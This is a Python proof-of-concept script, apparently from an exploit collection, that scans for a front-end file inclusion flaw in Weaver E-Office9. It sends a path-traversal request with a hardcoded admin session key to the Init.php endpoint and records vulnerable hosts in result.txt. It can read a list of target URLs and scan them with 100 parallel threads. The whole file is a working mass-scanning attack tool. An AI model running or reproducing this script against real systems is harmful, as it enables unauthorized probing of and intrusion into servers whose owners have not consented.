import requests,sys,re,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
 __          __                              ______       ____   __  __ _          ___   
 \ \        / /                             |  ____|     / __ \ / _|/ _(_)        / _ \  
  \ \  /\  / /__  __ ___   _____ _ __ ______| |__ ______| |  | | |_| |_ _  ___ __| (_) | 
   \ \/  \/ / _ \/ _` \ \ / / _ \ '__|______|  __|______| |  | |  _|  _| |/ __/ _ \__, | 
    \  /\  /  __/ (_| |\ V /  __/ |         | |____     | |__| | | | | | | (_|  __/ / /  
     \/  \/ \___|\__,_| \_/ \___|_|         |______|     \____/|_| |_| |_|\___\___|/_/   
                                                                                         
                                                                                         
"""

    print(test)



def main():
    banner()
    parser=argparse.ArgumentParser(description='泛微 Weaver E-Office9 前台文件包含')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    url_payload= '/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls'

    try:
        res1=requests.get(url=target+url_payload,timeout=10)
        if res1.status_code==200:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')



if __name__ =='__main__':
    main()
